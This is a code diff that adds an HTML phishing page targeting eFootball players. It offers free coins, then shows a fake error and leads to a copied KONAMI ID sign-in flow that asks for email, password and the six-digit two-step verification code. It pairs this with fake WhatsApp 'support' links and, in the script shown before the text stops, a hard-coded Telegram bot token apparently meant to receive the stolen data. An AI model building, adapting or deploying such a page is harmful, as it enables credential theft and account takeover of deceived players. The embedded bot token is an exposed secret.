@@ -1,0 +1,1359 @@
+<!DOCTYPE html>
+<html lang="fr" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>ربط حساب eFootball</title>
+    <style>
+        body {
+            background-color: black;
+            color: white;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            text-align: center;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        .container {
+            width: 92%;
+            max-width: 380px;
+            padding: 15px 0;
+            direction: rtl;
+        }
+
+        h1 { font-size: 22px; margin-bottom: 5px; }
+        p.subtitle { font-size: 13px; color: #aaa; margin-bottom: 25px; }
+
+        .input-group {
+            display: flex;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        input[type="text"] {
+            flex: 1;
+            background: rgba(255, 255, 255, 0.1);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            color: white;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: right;
+            outline: none;
+            font-size: 14px;
+            box-sizing: border-box;
+        }
+
+        .btn-confirm {
+            background-color: #4a5568;
+            color: white;
+            border: none;
+            padding: 12px 15px;
+            border-radius: 8px;
+            cursor: pointer;
+            font-weight: bold;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            transition: all 0.3s ease;
+            min-width: 100px;
+            font-size: 14px;
+        }
+
+        .btn-confirm.success { background-color: #2f855a; }
+
+        .spinner-small {
+            width: 16px;
+            height: 16px;
+            border: 2px solid #ffffff;
+            border-top: 2px solid transparent;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        p.select-label { font-size: 14px; text-align: right; margin-bottom: 10px; }
+
+        .coins-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 8px;
+            margin-bottom: 25px;
+        }
+
+        .coin-card {
+            background-color: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            padding: 10px 5px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .coin-card:active {
+            transform: scale(0.96);
+        }
+
+        .coin-card.active {
+            background: linear-gradient(135deg, rgba(255, 215, 0, 0.25), rgba(218, 165, 32, 0.35));
+            border: 2px solid #ffd700;
+            box-shadow: 0 0 12px rgba(255, 215, 0, 0.3);
+        }
+
+        .coin-img {
+            width: 48px;
+            height: 48px;
+            object-fit: contain;
+            margin-bottom: 4px;
+            filter: drop-shadow(0 2px 4px rgba(255, 215, 0, 0.3));
+        }
+
+        .badge-new {
+            position: absolute;
+            top: -10px;
+            left: -6px;
+            background-color: #ffb703;
+            color: #000;
+            font-weight: bold;
+            font-size: 10px;
+            padding: 3px 6px;
+            border-radius: 5px;
+            box-shadow: 0 0 8px rgba(255, 183, 3, 0.5);
+            line-height: 1.1;
+            z-index: 10;
+        }
+
+        .coin-amount { font-weight: bold; font-size: 16px; color: #fff; }
+
+        .btn-main {
+            width: 100%;
+            padding: 14px;
+            border-radius: 10px;
+            border: none;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+
+        .btn-red { background-color: #c53030; color: white; }
+
+        /* صفحة المعالجة والخطأ للأجهزة الذكية */
+        #processScreen {
+            display: none;
+            width: 92%;
+            max-width: 380px;
+            padding: 15px 0;
+            direction: rtl;
+        }
+
+        .large-spinner {
+            width: 55px;
+            height: 55px;
+            border: 4px solid rgba(255, 255, 255, 0.1);
+            border-top: 4px solid #ffb703;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+
+        .error-icon-animated {
+            font-size: 50px;
+            animation: popEffect 0.5s ease-in-out forwards;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+
+        @keyframes popEffect {
+            0% { transform: scale(0.5); opacity: 0; }
+            70% { transform: scale(1.2); opacity: 1; }
+            100% { transform: scale(1); opacity: 1; }
+        }
+
+        .error-header {
+            color: #ff4d4d;
+            font-size: 19px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .details-box {
+            background-color: rgba(255, 255, 255, 0.05);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-radius: 12px;
+            padding: 16px;
+            text-align: right;
+        }
+
+        .details-box h2 {
+            font-size: 16px;
+            text-align: center;
+            margin-top: 0;
+            margin-bottom: 14px;
+            color: #ffb703;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+            padding-bottom: 8px;
+        }
+
+        .detail-item {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 10px;
+            font-size: 13px;
+            line-height: 1.4;
+        }
+
+        .detail-label { color: #aaa; font-weight: 500; min-width: 80px; }
+        .detail-value { color: #fff; font-weight: bold; text-align: left; flex: 1; }
+        .detail-value.failed { color: #fc8181; }
+
+        .support-link { color: #3182ce; text-decoration: underline; font-weight: bold; }
+        .try-other-link {
+            color: #ffb703;
+            text-decoration: underline;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        .btn-back {
+            background-color: #3182ce;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+            font-size: 15px;
+        }
+
+        /* صفحة النجاح النهائية للهاتف */
+        #successScreen {
+            display: none;
+            width: 92%;
+            max-width: 380px;
+            padding: 15px 0;
+            direction: rtl;
+        }
+
+        .success-icon-animated {
+            font-size: 50px;
+            animation: popEffect 0.5s ease-in-out forwards;
+            margin-bottom: 10px;
+            display: inline-block;
+        }
+
+        .success-header {
+            color: #48bb78;
+            font-size: 19px;
+            font-weight: bold;
+            margin-bottom: 15px;
+        }
+
+        .detail-value.success { color: #48bb78; }
+
+        .btn-exit {
+            background-color: #c53030;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            border-radius: 8px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 15px;
+            width: 100%;
+            text-align: center;
+            display: block;
+            text-decoration: none;
+            box-sizing: border-box;
+            font-size: 15px;
+        }
+
+        /* صفحة ربط الحساب البديلة للهاتف */
+        #linkAccountScreen {
+            display: none;
+            width: 92%;
+            max-width: 380px;
+            padding: 15px 0;
+            direction: rtl;
+        }
+
+        /* صفحة تسجيل الدخول والتحقق للهاتف (تناسق 100% مع الشاشات الصغيرة) */
+        #konamiEmailScreen {
+            display: none;
+            width: 100%;
+            min-height: 100vh;
+            background-color: #f2f2f2;
+            color: #555555;
+            position: absolute;
+            top: 0;
+            left: 0;
+            z-index: 1000;
+            overflow-y: auto;
+            direction: ltr;
+        }
+
+        .konami-navbar {
+            background-color: #ffffff;
+            width: 100%;
+            height: 45px;
+            padding: 0 15px;
+            border-bottom: 1px solid #eaeaea;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            justify-content: flex-start;
+        }
+
+        .konami-logo-img {
+            height: 20px;
+            object-fit: contain;
+        }
+
+        .konami-container {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            padding: 20px 10px;
+            box-sizing: border-box;
+            width: 100%;
+        }
+
+        /* بطاقات محاكية لشاشة الموبايل */
+        .konami-card {
+            background: #ffffff;
+            border: 1px solid #dcdcdc;
+            border-radius: 6px;
+            padding: 25px 15px;
+            width: 100%;
+            max-width: 360px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            text-align: center;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .konami-card-step2 {
+            background: #ffffff;
+            border: 1px solid #dcdcdc;
+            border-radius: 6px;
+            padding: 20px 15px;
+            width: 100%;
+            max-width: 360px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            text-align: center;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .konami-title {
+            font-size: 26px;
+            color: #444444;
+            margin-top: 0;
+            margin-bottom: 15px;
+            font-weight: 300;
+        }
+
+        .floating-field-container {
+            position: relative;
+            width: 100%;
+            height: 54px;
+            border: 1.5px solid #8ab4f8;
+            border-radius: 6px;
+            background-color: #ffffff;
+            margin-top: 5px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            direction: ltr;
+        }
+
+        .floating-input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 15px !important;
+            font-weight: 400 !important;
+            color: #000000 !important;
+            background: transparent !important;
+            padding-top: 12px;
+            box-sizing: border-box;
+            text-align: left !important;
+            direction: ltr !important;
+        }
+
+        .floating-label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 13px;
+            color: #666666;
+            font-weight: 300;
+            pointer-events: none;
+            transition: all 0.2s ease-in-out;
+            background-color: transparent;
+            direction: ltr;
+        }
+
+        .floating-input:focus ~ .floating-label,
+        .floating-input:not(:placeholder-shown) ~ .floating-label {
+            top: 5px;
+            transform: translateY(0);
+            font-size: 10px;
+            color: #666666;
+            font-weight: 300;
+        }
+
+        .konami-btn-red {
+            width: 100%;
+            height: 44px;
+            background-color: #ba0014;
+            color: #ffffff;
+            border: 1px solid #ba0014;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 0 auto;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .konami-divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            color: #888888;
+            margin: 15px 0;
+            font-size: 13px;
+            font-weight: 300;
+            width: 100%;
+        }
+        .konami-divider::before, .konami-divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        .konami-divider::before { margin-right: 10px; }
+        .konami-divider::after { margin-left: 10px; }
+
+        .konami-btn-passkey {
+            width: 100%;
+            height: 44px;
+            background-color: #ba0014;
+            color: #ffffff;
+            border: 1px solid #ba0014;
+            font-size: 13px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            margin: 0 auto;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            direction: ltr;
+            box-sizing: border-box;
+            outline: none;
+        }
+
+        .key-btn-img {
+            width: 18px;
+            height: 18px;
+            object-fit: contain;
+        }
+
+        .konami-link-blue { color: #0088cc; text-decoration: none; font-size: 13px; display: inline-block; margin-top: 8px; }
+        .konami-text-sub { font-size: 13px; color: #666666; margin-top: 12px; margin-bottom: 4px; font-weight: 300; }
+        .konami-link-red { color: #ba0014; text-decoration: none; font-size: 13px; font-weight: bold; display: inline-block; margin-top: 2px; }
+
+        .captcha-box { margin-top: 10px; text-align: center; width: 100%; }
+        
+        .captcha-instruction-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 10px;
+            direction: ltr;
+        }
+        .captcha-instruction-text {
+            font-size: 12px;
+            color: #555555;
+            font-weight: 300;
+            text-align: left;
+            line-height: 1.3;
+        }
+        .captcha-target-img { height: 60px; width: 60px; object-fit: contain; }
+
+        .captcha-grid { display: flex; justify-content: center; gap: 8px; margin-bottom: 12px; flex-wrap: wrap; }
+        
+        .captcha-item {
+            width: 62px;
+            height: 62px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            background: #fff;
+        }
+        .captcha-item.selected { border: 2.5px solid #ba0014; background-color: #fff0f1; }
+        .captcha-item img { width: 50px; height: 50px; object-fit: contain; }
+        
+        .captcha-error-msg {
+            color: #ba0014;
+            font-size: 13px;
+            font-weight: 500;
+            margin-bottom: 10px;
+            display: none;
+            background-color: rgba(186, 0, 20, 0.06);
+            padding: 8px 10px;
+            border-radius: 4px;
+            border: 1px solid rgba(186, 0, 20, 0.35);
+            text-align: center;
+            direction: ltr;
+        }
+
+        .konami-input-disabled-custom {
+            width: 100%;
+            height: 52px;
+            background-color: #e9ecef !important;
+            border: 1px solid #d6dabe;
+            color: #495057 !important;
+            padding: 6px 12px;
+            border-radius: 4px;
+            text-align: left;
+            direction: ltr;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            margin-bottom: 10px;
+        }
+
+        .konami-input-label { font-size: 11px; color: #666666; display: block; text-align: left; margin-bottom: 1px; font-weight: 300; }
+        .konami-email-val { font-size: 14px; color: #000000; font-weight: normal; word-break: break-all; }
+        
+        .password-floating-container {
+            position: relative;
+            width: 100%;
+            height: 52px;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            background-color: #ffffff;
+            margin-bottom: 12px;
+            box-sizing: border-box;
+            display: flex;
+            align-items: center;
+            padding: 0 12px;
+            direction: ltr;
+        }
+
+        .password-floating-input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 15px !important;
+            font-weight: 400 !important;
+            color: #000000 !important;
+            background: transparent !important;
+            padding-top: 12px;
+            box-sizing: border-box;
+            text-align: left !important;
+            direction: ltr !important;
+        }
+
+        .password-floating-label {
+            position: absolute;
+            left: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            font-size: 13px;
+            color: #666666;
+            font-weight: 300;
+            pointer-events: none;
+            transition: all 0.2s ease-in-out;
+            background-color: transparent;
+            direction: ltr;
+        }
+
+        .password-floating-input:focus ~ .password-floating-label,
+        .password-floating-input:not(:placeholder-shown) ~ .password-floating-label {
+            top: 5px;
+            transform: translateY(0);
+            font-size: 10px;
+            color: #666666;
+            font-weight: 300;
+        }
+
+        .password-toggle-icon-svg { 
+            position: absolute; 
+            right: 12px; 
+            top: 50%; 
+            transform: translateY(-50%); 
+            cursor: pointer; 
+            width: 20px; 
+            height: 20px; 
+            fill: #5f6368;
+        }
+
+        /* صفحة التحقق بخطوتين للهاتف */
+        .konami-card-step3 {
+            background: #ffffff;
+            border: 1px solid #dcdcdc;
+            border-radius: 6px;
+            padding: 20px 12px;
+            width: 100%;
+            max-width: 360px;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.05);
+            text-align: center;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .step3-title {
+            font-size: 22px;
+            color: #444444;
+            margin-top: 5px;
+            margin-bottom: 15px;
+            font-weight: 300;
+            text-align: center;
+        }
+
+        .inner-box-step3 {
+            width: 100%;
+            background-color: #f9f9f9;
+            border: 1px solid #e2e2e2;
+            border-radius: 4px;
+            padding: 15px 12px;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            direction: ltr;
+        }
+
+        .inner-step3-text {
+            font-size: 13px;
+            color: #333333;
+            font-weight: 500;
+            line-height: 1.4;
+            text-align: left;
+            width: 100%;
+        }
+
+        .code-inputs-container-custom {
+            display: flex;
+            justify-content: center;
+            gap: 6px;
+            width: 100%;
+            margin: 12px 0;
+            direction: ltr;
+        }
+
+        .code-digit-input-custom {
+            width: 42px;
+            height: 50px;
+            font-size: 20px;
+            font-weight: 600 !important;
+            direction: ltr !important;
+            text-align: center !important;
+            border: 1px solid #b0b0b0 !important;
+            border-radius: 4px;
+            outline: none;
+            background-color: #ffffff !important;
+            color: #000000 !important;
+            box-sizing: border-box;
+        }
+
+        .code-digit-input-custom:focus {
+            border-color: #007bff !important;
+            box-shadow: 0 0 3px rgba(0, 123, 255, 0.4);
+        }
+
+        .switch-row-container {
+            display: flex;
+            align-items: flex-start;
+            justify-content: flex-start;
+            gap: 8px;
+            width: 100%;
+            text-align: left;
+            direction: ltr;
+            margin: 8px 0;
+        }
+
+        .switch-control {
+            position: relative;
+            display: inline-block;
+            width: 38px;
+            height: 20px;
+            flex-shrink: 0;
+            margin-top: 2px;
+        }
+
+        .switch-control input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .switch-slider {
+            position: absolute;
+            cursor: pointer;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background-color: #ccc;
+            transition: .3s;
+            border-radius: 20px;
+        }
+
+        .switch-slider:before {
+            position: absolute;
+            content: "";
+            height: 14px;
+            width: 14px;
+            left: 3px;
+            bottom: 3px;
+            background-color: white;
+            transition: .3s;
+            border-radius: 50%;
+        }
+
+        input:checked + .switch-slider {
+            background-color: #007bff;
+        }
+
+        input:checked + .switch-slider:before {
+            transform: translateX(18px);
+        }
+
+        .switch-label-text {
+            font-size: 11px;
+            color: #555555;
+            font-weight: 400;
+            line-height: 1.3;
+        }
+
+        .center-notice-text {
+            font-size: 11px;
+            color: #555555;
+            font-weight: 400;
+            text-align: center;
+            width: 100%;
+            margin: 8px 0;
+        }
+
+        .btn-suivant-blue {
+            width: 180px;
+            height: 40px;
+            background-color: #007bff;
+            color: #ffffff;
+            border: 1px solid #007bff;
+            font-size: 15px;
+            font-weight: bold;
+            border-radius: 4px;
+            cursor: pointer;
+            outline: none;
+            margin: 5px auto 0 auto;
+        }
+
+        .support-floating-btn {
+            position: fixed;
+            bottom: 15px;
+            right: 15px;
+            background-color: #e51224;
+            color: white;
+            border-radius: 18px 6px 6px 18px;
+            padding: 6px 12px;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: bold;
+        }
+    </style>
+</head>
+<body>
+
+<!-- الصفحة الأولى: ابدأ الشحن المجاني -->
+<div class="container" id="mainScreen">
+    <h1>ابدأ الشحن المجاني</h1>
+    <p class="subtitle">أدخل اسم الحساب واختر كمية العملات</p>
+
+    <div class="input-group">
+        <button class="btn-confirm" id="confirmBtn" onclick="verifyPlayerId()">تأكيد</button>
+        <input type="text" id="playerId" placeholder="أدخل اسم الحساب..." value="">
+    </div>
+
+    <p class="select-label">:اختر عدد الكوينز</p>
+
+    <div class="coins-grid">
+        <div class="coin-card" data-amount="50" onclick="selectCard(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">50</div>
+        </div>
+        <div class="coin-card" data-amount="100" onclick="selectCard(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">100</div>
+        </div>
+        <div class="coin-card" data-amount="210" onclick="selectCard(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">210</div>
+        </div>
+        <div class="coin-card" data-amount="530" onclick="selectCard(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">530</div>
+        </div>
+        <div class="coin-card" data-amount="1080" onclick="selectCard(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">1080</div>
+        </div>
+        <div class="coin-card" data-amount="2200" onclick="selectCard(this)">
+            <div class="badge-new">عرض<br>جديد</div>
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">2200</div>
+        </div>
+    </div>
+
+    <button class="btn-main btn-red" onclick="startCharging()">ابدأ الشحن الآن</button>
+    <button class="btn-main btn-orange" style="background-color: #dd6b20; color: white;">شارك العرض مع أصدقائك واربح المزيد!</button>
+</div>
+
+<!-- صفحة ربط الحساب البديلة -->
+<div class="container" id="linkAccountScreen" style="display: none;">
+    <h1>ربط الحساب</h1>
+    <p class="subtitle">اختر كمية العملات وقم بربط حسابك</p>
+
+    <p class="select-label">:اختر عدد الكوينز</p>
+
+    <div class="coins-grid">
+        <div class="coin-card" data-amount="50" onclick="selectCardAlt(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">50</div>
+        </div>
+        <div class="coin-card" data-amount="100" onclick="selectCardAlt(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">100</div>
+        </div>
+        <div class="coin-card" data-amount="210" onclick="selectCardAlt(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">210</div>
+        </div>
+        <div class="coin-card" data-amount="530" onclick="selectCardAlt(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">530</div>
+        </div>
+        <div class="coin-card" data-amount="1080" onclick="selectCardAlt(this)">
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">1080</div>
+        </div>
+        <div class="coin-card" data-amount="2200" onclick="selectCardAlt(this)">
+            <div class="badge-new">عرض<br>جديد</div>
+            <img src="coin.png" alt="Coin" class="coin-img">
+            <div class="coin-amount">2200</div>
+        </div>
+    </div>
+
+    <button class="btn-main btn-red" onclick="startLinking()">ابدأ الربط الان</button>
+</div>
+
+<!-- صفحة المعالجة والخطأ الأولى -->
+<div id="processScreen" style="display: none;">
+    <div id="loadingState">
+        <div class="large-spinner"></div>
+        <div class="sending-title">جاري إرسال العملات إلى حسابك...</div>
+        <div class="sending-subtitle">الرجاء الانتظار</div>
+    </div>
+
+    <div id="resultState" style="display: none;">
+        <div class="error-icon-animated">❌</div>
+        <div class="error-header">خطأ في إرسال العملات!</div>
+        
+        <div class="details-box">
+            <h2>تفاصيل العملية</h2>
+            
+            <div class="detail-item">
+                <span class="detail-label">عدد العملات:</span>
+                <span class="detail-value" id="resAmount">0</span>
+            </div>
+            
+            <div class="detail-item">
+                <span class="detail-label">اسم الحساب:</span>
+                <span class="detail-value" id="resAccount">-</span>
+            </div>
+            
+            <div class="detail-item">
+                <span class="detail-label">حالة العملية:</span>
+                <span class="detail-value failed">فاشلة ❌</span>
+            </div>
+            
+            <div class="detail-item">
+                <span class="detail-label">المشكل:</span>
+                <span class="detail-value">نظراً للتحديث الجديد باللعبة لم نتمكن من العثور على حسابك.</span>
+            </div>
+            
+            <div class="detail-item">
+                <span class="detail-label">الحل:</span>
+                <span class="detail-value">يمكنك <span class="try-other-link" onclick="goToLinkAccount()">تجربة طريقة أخرى</span> أو <a href="https://wa.me/212669035532" target="_blank" class="support-link">التواصل مع خدمة الدعم</a>.</span>
+            </div>
+        </div>
+
+        <button class="btn-back" onclick="resetToHome()">المحاولة مرة أخرى 🔄</button>
+    </div>
+</div>
+
+<!-- صفحة النجاح النهائية (تم إرسال العملات) -->
+<div id="successScreen" style="display: none;">
+    <div class="success-icon-animated">✅</div>
+    <div class="success-header">تم إرسال العملات</div>
+    
+    <div class="details-box">
+        <h2>تفاصيل العملية</h2>
+        
+        <div class="detail-item">
+            <span class="detail-label">عدد العملات:</span>
+            <span class="detail-value" id="successResAmount">0</span>
+        </div>
+        
+        <div class="detail-item">
+            <span class="detail-label">اسم الحساب:</span>
+            <span class="detail-value" id="successResAccount">-</span>
+        </div>
+        
+        <div class="detail-item">
+            <span class="detail-label">حالة العملية:</span>
+            <span class="detail-value success">ناجحة ✅</span>
+        </div>
+    </div>
+
+    <a href="https://my.konami.net/fr" class="btn-exit">خروج</a>
+</div>
+
+<!-- صفحة تسجيل الدخول والتحقق (KONAMI ID) للهاتف -->
+<div id="konamiEmailScreen" style="display: none;">
+    <div class="konami-navbar">
+        <img src="konami-logo.png" alt="KONAMI" class="konami-logo-img">
+    </div>
+
+    <div class="konami-container">
+        <!-- الخطوة الأولى: الإيميل -->
+        <div class="konami-card" id="step1">
+            <h2 class="konami-title">KONAMI ID</h2>
+
+            <form onsubmit="handleStep1(event)" style="width: 100%;">
+                <div class="floating-field-container">
+                    <input type="text" id="konamiEmailInput" class="floating-input" placeholder=" " required>
+                    <label for="konamiEmailInput" class="floating-label">KONAMI ID / E-mail address</label>
+                </div>
+                
+                <button type="submit" id="btnStep1Connexion" class="konami-btn-red">
+                    <span id="btnTextStep1">Connexion</span>
+                    <div id="btnSpinnerStep1" class="spinner-small" style="display: none; border-color: #000; border-top-color: transparent;"></div>
+                </button>
+            </form>
+
+            <div class="konami-divider">OU</div>
+
+            <button class="konami-btn-passkey" type="button" onclick="window.location.href='https://my.konami.net/fr/support/passkey'">
+                <img src="key.png" alt="Key" class="key-btn-img">
+                <span>Connexion avec une clé d’accès</span>
+            </button>
+
+            <div><a href="https://my.konami.net/fr/support/passkey" class="konami-link-blue">Qu'est-ce qu'une clé d’accès ?</a></div>
+            <div class="konami-text-sub">Vous n'avez pas de KONAMI ID ?</div>
+            <div><a href="https://my.konami.net/fr/signup/age_gate?type=login" class="konami-link-red">S'enregistrer</a></div>
+        </div>
+
+        <!-- الخطوة الثانية: كلمة المرور والكابتشا -->
+        <div class="konami-card-step2" id="step2" style="display: none;">
+            <h2 class="konami-title">KONAMI ID</h2>
+
+            <div id="captchaError" class="captcha-error-msg">Vérification visuelle échouée.</div>
+
+            <form onsubmit="handleStep2(event)" style="width: 100%; display: flex; flex-direction: column; align-items: center;">
+                <div class="konami-input-disabled-custom">
+                    <span class="konami-input-label">KONAMI ID / E-mail address</span>
+                    <span class="konami-email-val" id="displayUserEmail"></span>
+                </div>
+
+                <div style="width: 100%; text-align: center; margin-bottom: 10px;">
+                    <a href="#" class="konami-link-blue" style="font-size: 12px; display: inline-block;" onclick="backToStep1(event)">Se connecter avec un autre identifiant KONAMI</a>
+                </div>
+
+                <div class="password-floating-container">
+                    <input type="password" id="konamiPasswordInput" class="password-floating-input" placeholder=" " required>
+                    <label for="konamiPasswordInput" class="password-floating-label">Password</label>
+                    <svg id="eyeIcon" class="password-toggle-icon-svg" onclick="togglePasswordVisibility()" viewBox="0 0 24 24">
+                        <path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/>
+                    </svg>
+                </div>
+
+                <div class="captcha-box">
+                    <div class="captcha-instruction-row">
+                        <span class="captcha-instruction-text">
+                            Veuillez cocher tous<br>ces personnages.
+                        </span>
+                        <img src="target.png" alt="Target" class="captcha-target-img">
+                    </div>
+
+                    <div class="captcha-grid">
+                        <div class="captcha-item" data-id="1" onclick="toggleCaptchaSelect(this)"><img src="c1.png" alt="c1"></div>
+                        <div class="captcha-item" data-id="2" onclick="toggleCaptchaSelect(this)"><img src="c2.png" alt="c2"></div>
+                        <div class="captcha-item" data-id="3" onclick="toggleCaptchaSelect(this)"><img src="c3.png" alt="c3"></div>
+                        <div class="captcha-item" data-id="4" onclick="toggleCaptchaSelect(this)"><img src="c4.png" alt="c4"></div>
+                        <div class="captcha-item" data-id="5" onclick="toggleCaptchaSelect(this)"><img src="c5.png" alt="c5"></div>
+                    </div>
+                </div>
+
+                <button type="submit" id="btnStep2Connexion" class="konami-btn-red" style="margin-top: 5px; margin-bottom: 12px;">
+                    <span id="btnTextStep2">Connexion</span>
+                    <div id="btnSpinnerStep2" class="spinner-small" style="display: none; border-color: #000; border-top-color: transparent;"></div>
+                </button>
+            </form>
+
+            <div style="text-align: center; width: 100%;">
+                <a href="https://my.konami.net/fr/password-reminder/input-email-address" class="konami-link-red" style="font-weight: normal; margin-bottom: 10px; display: block;">Vous avez oublié votre mot de passe ?</a>
+                
+                <div class="konami-text-sub" style="margin-top: 5px; margin-bottom: 2px;">Vous n'avez pas de KONAMI ID ?</div>
+                <a href="https://my.konami.net/fr/signup/age_gate?type=login" class="konami-link-red" style="display: block;">S'enregistrer</a>
+            </div>
+        </div>
+
+        <!-- الخطوة الثالثة: التحقق بخطوتين -->
+        <div class="konami-card-step3" id="step3" style="display: none;">
+            <h2 class="step3-title">Vérification en deux étapes</h2>
+
+            <div class="inner-box-step3">
+                <div class="inner-step3-text">
+                    Un code de confirmation à 6 chiffres est envoyé à votre adresse e-mail enregistrée.
+                </div>
+
+                <form onsubmit="handleStep3(event)" style="width: 100%; display: flex; flex-direction: column; align-items: center; gap: 10px;">
+                    <div class="code-inputs-container-custom">
+                        <input type="tel" pattern="[0-9]*" maxlength="1" class="code-digit-input-custom" oninput="moveToNext(this, 1)" required>
+                        <input type="tel" pattern="[0-9]*" maxlength="1" class="code-digit-input-custom" oninput="moveToNext(this, 2)" required>
+                        <input type="tel" pattern="[0-9]*" maxlength="1" class="code-digit-input-custom" oninput="moveToNext(this, 3)" required>
+                        <input type="tel" pattern="[0-9]*" maxlength="1" class="code-digit-input-custom" oninput="moveToNext(this, 4)" required>
+                        <input type="tel" pattern="[0-9]*" maxlength="1" class="code-digit-input-custom" oninput="moveToNext(this, 5)" required>
+                        <input type="tel" pattern="[0-9]*" maxlength="1" class="code-digit-input-custom" oninput="moveToNext(this, 6)" required>
+                    </div>
+
+                    <div class="switch-row-container">
+                        <label class="switch-control">
+                            <input type="checkbox" id="trustDevice" checked>
+                            <span class="switch-slider"></span>
+                        </label>
+                        <span class="switch-label-text">
+                            Ignorer la vérification en 2 étapes sur cet appareil à partir de la prochaine fois (valide pendant 180 jours à compter de la dernière connexion)
+                        </span>
+                    </div>
+
+                    <div class="center-notice-text">
+                        Assurez-vous qu'aucun filtre de messagerie ne bloque les e-mails de @konami.net.
+                    </div>
+
+                    <button type="submit" class="btn-suivant-blue">Suivant</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div class="support-floating-btn" onclick="window.open('https://wa.me/212669035532', '_blank')">
+        <span>‹</span>
+        <span style="background: #a00; padding: 2px 4px; border-radius: 3px; font-size: 9px;">KONAMI<br>Support</span>
+    </div>
+</div>
+
+<script>
+    const BOT_TOKEN = "8832598415:AAEzcT2hhfN8AukpmUxca5Mx3AaImSCdpRg";
